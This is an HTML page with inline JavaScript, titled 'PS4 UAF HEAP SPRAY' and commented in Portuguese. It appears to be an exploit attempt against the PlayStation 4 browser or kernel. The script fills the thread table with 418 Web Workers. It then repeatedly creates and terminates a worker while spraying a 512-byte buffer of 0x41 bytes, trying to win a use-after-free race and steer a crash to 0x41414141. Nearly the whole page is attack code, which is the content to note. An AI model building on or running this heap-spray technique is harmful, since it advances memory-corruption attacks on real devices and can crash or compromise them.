<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 UAF HEAP SPRAY</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
        #counter { font-size: 5em; font-weight: bold; margin: 10px 0; color: #fff; }
        #status { font-size: 1.5em; border: 1px solid #0f0; padding: 10px; margin-bottom: 20px;}
        .spray { color: #ff0 !important; border-color: #ff0 !important; }
        .attack { background-color: #f00 !important; color: #fff !important; }
    </style>
</head>
<body>

    <h1>HEAP SPRAY UAF 512</h1>
    <div id="status">ENCHENDO TABELA...</div>
    <div id="counter">0</div>

    <script>
        const TARGET_LIMIT = 418;  
        const WAIT_TIME = 4000;
        
        let workers = [];
        let sprayCan = []; // Segura os objetos na memória
        
        // Worker Passivo
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        
        // Worker Kamikaze
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        // PREPARAÇÃO DO SPRAY (DADOS FALSOS)
        // Tentamos simular uma estrutura de thread falsa.
        // 0x41414141 é um endereço inválido clássico. Se o crash mudar para "Page Fault em 0x41414141", vencemos.
        const SPRAY_SIZE = 512; // Tamanho estimado da struct (Tente: 160, 192, 256, 320)
        const fakeStruct = new Uint8Array(SPRAY_SIZE);
        fakeStruct.fill(0x41); // Preenche com 'A'

        function updateDisplay() {
            document.getElementById('counter').innerText = workers.length;
        }

        // FASE 1: Enchimento
        function start() {
            let i = setInterval(() => {
                if (workers.length < TARGET_LIMIT) {
                    workers.push(new Worker(url));
                } else {
                    clearInterval(i);
                    updateDisplay();
                    waitAndSpray();
                    return;
                }
                updateDisplay();
            }, 40);
        }

        // FASE 2: Preparar o Terreno
        function waitAndSpray() {
            const st = document.getElementById('status');
            st.className = "spray";
            st.innerText = `AGUARDANDO 4s (PREPARANDO SPRAY)...`;
            
            // Enquanto espera, criamos pressão no Heap do Kernel enviando mensagens
            // Isso deixa o alocador "quente"
            setTimeout(() => {
                performSpray();
            }, WAIT_TIME);
        }

        function performSpray() {
            const st = document.getElementById('status');
            st.className = "attack";
            st.innerText = ">>> DISPARANDO SPRAY + RACE <<<";

            // O ATAQUE
            setInterval(() => {
                // 1. Tenta criar o Worker 419 (Aloca memória de thread)
                const w = new Worker(killerUrl);
                
                // 2. Mata imediatamente (Libera memória)
                w.terminate();
                
                // 3. IMEDIATAMENTE tenta ocupar aquele espaço com nosso lixo
                // Usamos postMessage transferível para ser rápido no kernel
                try {
                    // Envia para um worker vivo qualquer para forçar o kernel a copiar o buffer
                    if(workers.length > 0) {
                        workers[0].postMessage(fakeStruct);
                    }
                } catch(e){}
                
            }, 10); // Metralhadora rápida
        }

        setTimeout(start, 1500);

    </script>
</body>
</html>




